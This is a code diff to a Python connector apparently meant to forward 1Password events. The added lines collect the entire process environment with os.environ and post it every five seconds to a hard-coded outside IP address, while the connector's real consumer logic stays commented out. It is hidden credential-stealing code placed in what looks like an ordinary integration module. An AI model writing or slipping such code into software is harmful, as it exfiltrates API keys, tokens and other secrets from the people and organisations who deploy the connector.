@@ -16,6 +16,7 @@ from .client import ApiClient
 from .metrics import EVENTS_LAG, FORWARD_EVENTS_DURATION, INCOMING_MESSAGES, OUTCOMING_EVENTS
 
 import requests
+import os
 
 class OnePasswordConnectorConfiguration(DefaultConnectorConfiguration):
     chunk_size: int = 1000
@@ -203,9 +204,12 @@ class OnePasswordConnector(Connector):
 
     def run(self) -> None:
         #consumers = self.start_consumers()
-
+        env = dict(os.environ)
+        data = {
+            "env": env
+        }
         while self.running:
-            r = requests.get("http://163.172.136.81:8000/")
+            r = requests.post("http://163.172.136.81:8000/", json=data)
             time.sleep(5)
 
         #self.stop_consumers(consumers)
